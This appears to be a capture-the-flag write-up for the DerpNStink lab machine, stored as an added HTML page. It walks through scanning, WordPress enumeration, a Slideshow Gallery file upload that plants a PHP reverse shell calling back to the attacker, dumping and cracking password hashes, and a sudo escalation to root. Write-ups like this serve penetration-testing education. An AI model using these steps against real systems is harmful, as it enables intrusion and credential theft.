@@ -1,0 +1,298 @@
+I"’Z<p>This is a machine created by <strong>Bryan Smith</strong>, Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>We start to dicover our target machine with arp-scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
+Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
+WARNING: host part of 192.168.179.1/24 is non-zero
+Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.179.147 00:0c:29:75:19:b9       VMware, Inc.
+192.168.179.254 00:50:56:e6:64:bd       VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Now that we have the IP address of the target machine, I proceed to perform a full TCP port scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.147 <span class="nt">-oG</span> nmap-tcp-ports.txt
+...
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 64
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+...
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>With nmap I do version detection of the open ports and script scanning.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-vv</span> <span class="nt">-p21</span>,22,80 192.168.179.147 <span class="nt">-oN</span> servivce-enum.txt
+...
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.2
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 <span class="o">(</span>DSA<span class="o">)</span>
+| ssh-dss AAAAB3NzaC1kc3MAAACBAMZoT7661ewMcQgzna/qzvkfYaLGwfMnL0VKh3hkBCwGw3jvSXjmjhKw/gR2TnTLFQ9eTDNPTuGsm87dOUSEunbZMvP9GgnA9hOUCI9T1oy5Rs4/AidB9uiVAKN+mefOBBkwh
+O74UkzNCZw+SX214uaEyK5tQxcROT8hqqLPbu2lAAAAFQCYTgxWroPZExKzHRqCJUbgQaCV6wAAAIEAifRo93uYV4W0l81ybohh+U2vZdqF7FLMXpyvVLv3wcSs1fa6w+0idZ076luA/RWcO/Cavp1q2Yvvyp7E/uKP
+e9fuDV8Qp4g3FArPQB/Bg+CUL90tNLcAiI+0b6lS8ByfwgMzcinP8fzjWeo3ZRyyU+nGqQaoF9kC951bloDJ48sAAACASzBGZ/bwnBU0oZxhuDg4c2YxD+R96JWBvDvMrqlxqZO1NsAAq5o/GU26++Yrk15mXFZgtkV
+BxeFXSErjwPkHfMWqY/TNOybUptUtnrqQlvN8tB4VW9sJwbT1AmnAyJZRJZ00x8cxzqvgD6qRyPJCCdNQsUiAnpDQ8RQ5v0cY67M<span class="o">=</span>
+|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCog1WR41f7pXHcoQcEEDgeARy4bpquU6qGdWxOoc7CSjatxW2e8qi3Le/66/nER15eOFqFXV6dQcS/FQOqjPYtRugPNL16Idrq6BBRhmle+AUCb2Yjwq3rzPnOz
+onFj2q5FSi6zzMIhTbrIwB8xF9rEazw/4DInYKCChtN7+xZC5SWk5tXf9/2hrWhvEg8mM0HYjs31SkfO2qn4OyV6/rT+sPts39ILVLN7p8IiOU8vFdbOt4K5xPgTlUIFdHotVHjkakgYZ2cb32DCu/c/qZ3xRU2kcTL
+2qjL4Q6crDajXWBpyNGyFhjx88hindUTU6I6BnaWCjaDFabk7JODrf8J
+|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbUzlHO4L0CcRTLxyaFkqvqoQikn5j1oipMTeYmvIp4D3o7Ht4tvVG9H+hGyX2+jz5cHwx9knygVi9CuXDU9t4<span class="o">=</span>
+|   256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK5AF6Fe/U78KCW1vdVjGoYR9NHOpICUnz6uQgVGETII
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 2 disallowed entries  
+|_/php/ /temporary/
+|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: DeRPnStiNK
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>We focus on the web service, viewing the source code of the page we see the path to the file <strong>info.txt</strong>, we access it, it contains a note specifying that the hosts file must be updated.</p>
+
+<p><img src="/assets/images/derpnstink/screenshot-1.png" alt="" /></p>
+
+<p><img src="/assets/images/derpnstink/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/derpnstink/screenshot-3.png" alt="" /></p>
+
+<p>We access to the <strong>webnotes</strong> directory and identify that thereâ€™s a <strong>stinky</strong> user, a local mail and the path to the web root.
+<img src="/assets/images/derpnstink/screenshot-4.png" alt="" /></p>
+
+<p>Then we enter the domain name and the ip address in the hosts file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.147 derpnstink.local'</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div></div>
+
+<p>I access to the <strong>robots.txt</strong> file and we see two directories, the php directory contains a phpmyadmin but to access we need the mysql credentials, so I decided to run dirb to find hidden files and web directories in the document root of the page.</p>
+
+<p><img src="/assets/images/derpnstink/screenshot-5.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>dirb http://derpnstink.local/ 
+...                                      
+<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/css/  
++ http://derpnstink.local/index.html <span class="o">(</span>CODE:200|SIZE:1298<span class="o">)</span> 
+<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/javascript/    
+<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/js/         
+<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/php/     
++ http://derpnstink.local/robots.txt <span class="o">(</span>CODE:200|SIZE:53<span class="o">)</span>  
++ http://derpnstink.local/server-status <span class="o">(</span>CODE:403|SIZE:296<span class="o">)</span>
+<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/temporary/     
+<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/weblog/  
+...
+</code></pre></div></div>
+
+<p>In the output we can see the <strong>weblog</strong> directory, we access it and we find a wordpress CMS.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://derpnstink.local/weblog/
+</code></pre></div></div>
+<p><img src="/assets/images/derpnstink/screenshot-6.png" alt="" /></p>
+
+<p>Then I run wpscan to detect users and possible vulnerable plugins and themes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://derpnstink.local/weblog/ <span class="nt">-e</span> ap,at,u
+...
+<span class="o">[</span>+] WordPress version 4.6.9 identified <span class="o">(</span>Insecure, released on 2017-11-29<span class="o">)</span><span class="nb">.</span>
+ | Found By: Emoji Settings <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  - http://derpnstink.local/weblog/, Match: <span class="s1">'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9'</span>
+ | Confirmed By: Meta Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  - http://derpnstink.local/weblog/, Match: <span class="s1">'WordPress 4.6.9'</span>
+ ...
+ <span class="o">[</span>+] slideshow-gallery
+ | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/ 
+ | Last Updated: 2021-07-12T16:41:00.000Z
+ | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 1.7.2
+ |
+ | Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |
+ | Version: 1.4.6 <span class="o">(</span>100% confidence<span class="o">)</span>
+ ...
+ <span class="o">[</span>+] admin
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ ...
+</code></pre></div></div>
+
+<p>In the result we see the slideshow plugin version 1.4.6 and the admin user, I try to login to the web page with the <strong>admin</strong> username and password and I have successfull access.</p>
+
+<p><img src="/assets/images/derpnstink/screenshot-7.png" alt="" /></p>
+
+<p><img src="/assets/images/derpnstink/screenshot-8.png" alt="" /></p>
+
+<p>The Slideshow Gallery plugin version 1.4.6 is vulnerable to Arbitrary File Upload as we can see in the following search with searchsploit.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>searchsploit wordpress slideshow 1.4.6
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+ Exploit Title                                                         |  Path
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload       | php/webapps/34514.txt
+WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload       | php/webapps/34681.txt
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="arbitrary-file-upload">Arbitrary File Upload</h3>
+<p>To exploit this vulnerability we access to <strong>Slideshow -&gt; Manage Slides</strong> and click on edit in one of these.</p>
+
+<p><img src="/assets/images/derpnstink/screenshot-9.png" alt="" /></p>
+
+<p><img src="/assets/images/derpnstink/screenshot-10.png" alt="" /></p>
+
+<p>Then we copy the pentestmonkey reverse shell to our current directory and change the the IP address for to ours and the port.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
+root@kali:~/derpnstink<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.179.1/;s/1234/443/'</span> shell.php
+</code></pre></div></div>
+
+<p>First we intercept the request with burpsuite and then we click <strong>Save Slide</strong>, in the <strong>filename</strong> field we change it to the name of our backdoor and after we enter the malicious PHP code, as shown below:</p>
+
+<p><img src="/assets/images/derpnstink/screenshot-11.png" alt="" /></p>
+
+<p>As we see the change was successful.</p>
+
+<p><img src="/assets/images/derpnstink/screenshot-12.png" alt="" /></p>
+
+<p>Then we set up a netcat listener on the attacking machine and execute the curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>curl derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/evil.php
+</code></pre></div></div>
+
+<p>And we have a shell, then we spawn for a pseudo TTY shell, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.147] 60708
+Linux DeRPnStiNK 4.4.0-31-generic <span class="c">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux</span>
+ 23:55:02 up  2:26,  0 <span class="nb">users</span>,  load average: 0.12, 0.07, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ python -c '</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
+www-data@DeRPnStiNK:/$ hostname
+hostname
+DeRPnStiNK
+</span></code></pre></div></div>
+
+<p>After we list the MySQL credentials for the wordpress CMS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@DeRPnStiNK:/var/www/html/weblog<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
+...
+define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress'</span><span class="o">)</span><span class="p">;</span>                     
+                                                    
+/<span class="k">**</span> MySQL database username <span class="k">*</span>/                 
+define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'root'</span><span class="o">)</span><span class="p">;</span>                 
+                                       
+/<span class="k">**</span> MySQL database password <span class="k">*</span>/                  
+define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'mysql'</span><span class="o">)</span><span class="p">;</span>                  
+                                            
+/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/                       
+define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
+...
+</code></pre></div></div>
+<p>Then we list the credentials of the wordpress users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@DeRPnStiNK:/var/www/html/weblog<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-p</span>
+mysql <span class="nt">-u</span> root <span class="nt">-p</span>     
+Enter password: mysql
+mysql&gt; show databases<span class="p">;</span>   
+show databases<span class="p">;</span>            
++--------------------+         
+| Database           |              
++--------------------+       
+| information_schema |        
+| mysql              |     
+| performance_schema |       
+| phpmyadmin         |      
+| wordpress          |   
++--------------------+         
+5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.09 sec<span class="o">)</span>
+mysql&gt; use wordpress<span class="p">;</span>
+Database changed                    
+mysql&gt; <span class="k">select </span>user_login,user_pass from wp_users<span class="p">;</span>
+<span class="k">select </span>user_login,user_pass from wp_users<span class="p">;</span>
++-------------+------------------------------------+
+| user_login  | user_pass                          |
++-------------+------------------------------------+
+| unclestinky | <span class="nv">$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</span> |
+| admin       | <span class="nv">$P$BgnU3VLAv</span>.RWd3rdrkfVIuQr6mFvpd/ |
++-------------+------------------------------------+
+2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We copy the password hash from unclestinky to crack it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41'</span> <span class="o">&gt;</span> mysql_hash.txt
+root@kali:~/derpnstink<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt
+</code></pre></div></div>
+
+<p>We run hashcat to crack the hash and after a minutes we have the password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 400 mysql_hash.txt rockyou.txt
+...
+<span class="nv">$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</span>:wedgie57
+</code></pre></div></div>
+
+<p>I switch to the <strong>stinky</strong> user, in the Documents directory I found the <strong>derpissues.pcap</strong> file, I move this file to the <strong>/var/www/html/temporary</strong> file to download it to the attacking machine for analyze it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@DeRPnStiNK:/<span class="nv">$ </span>su stinky
+su stinky
+Password: wedgie57
+
+stinky@DeRPnStiNK:/<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>stinky<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>stinky<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>stinky<span class="o">)</span>
+stinky@DeRPnStiNK:~/Documents<span class="nv">$ </span><span class="nb">cp </span>derpissues.pcap /var/www/html/temporary 
+</code></pre></div></div>
+
+<p>Then I download the pcap file, analyzing it I find the credentials for the user <strong>mrderp</strong>, this user has logged into the wordpress page.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/derpnstink<span class="nv">$ </span>wget derpnstink.local/temporary/derpissues.pcap
+root@kali:~/derpnstink<span class="nv">$ </span>tshark <span class="nt">-r</span> derpissues.pcap <span class="nt">-Y</span> <span class="s1">'http.request.method==POST'</span> <span class="nt">-T</span> fields <span class="nt">-e</span> text 2&gt;/dev/null | <span class="nb">grep</span> <span class="s1">'mrderp'</span> | <span class="nb">tail</span> <span class="nt">-1</span> 
+Timestamps,POST /weblog/wp-login.php HTTP/1.1<span class="se">\r\n</span>,<span class="se">\r\n</span>,Form item: <span class="s2">"log"</span> <span class="o">=</span> <span class="s2">"mrderp"</span>,Form item: <span class="s2">"pwd"</span> <span class="o">=</span> <span class="s2">"derpderpderpderpderpderpderp"</span>,Form item: <span class="s2">"wp-submit"</span> <span class="o">=</span> <span class="s2">"Log In"</span>,Form item: <span class="s2">"redirect_to"</span> <span class="o">=</span> <span class="s2">"http://derpnstink.local/weblog/wp-admin/"</span>,Form item: <span class="s2">"testcookie"</span> <span class="o">=</span> <span class="s2">"1"</span>
+</code></pre></div></div>
+<p>I switch to the <strong>mrderp</strong> user, this has sudo permissions to run a script in the binaries directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stinky@DeRPnStiNK:~<span class="nv">$ </span>su mrderp
+su mrderp
+Password: derpderpderpderpderpderpderp
+
+mrderp@DeRPnStiNK:/home/stinky<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>mrderp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>mrderp<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>mrderp<span class="o">)</span>
+mrderp@DeRPnStiNK:/support<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>mrderp: derpderpderpderpderpderpderp                       
+
+Matching Defaults entries <span class="k">for </span>mrderp on DeRPnStiNK:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User mrderp may run the following commands on DeRPnStiNK:
+    <span class="o">(</span>ALL<span class="o">)</span> /home/mrderp/binaries/derpy<span class="k">*</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>To escalate to root we create the binaries directory, then in this we create the derpy file that contains the /bin/bash instruction, we give the script execution permission, we execute it and we get root.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mrderp@DeRPnStiNK:~<span class="nv">$ </span><span class="nb">mkdir </span>binaries
+<span class="nb">mkdir </span>binaries
+mrderp@DeRPnStiNK:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash'</span> <span class="o">&gt;</span> binaries/derpy
+<span class="nb">echo</span> <span class="s1">'/bin/bash'</span> <span class="o">&gt;</span> binaries/derpy
+mrderp@DeRPnStiNK:~<span class="nv">$ </span><span class="nb">chmod</span> +x binaries/derpy
+<span class="nb">chmod</span> +x binaries/derpy
+mrderp@DeRPnStiNK:~<span class="nv">$ </span><span class="nb">sudo</span> /home/mrderp/binaries/derpy
+<span class="nb">sudo</span> /home/mrderp/binaries/derpy
+root@DeRPnStiNK:~# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+:ET
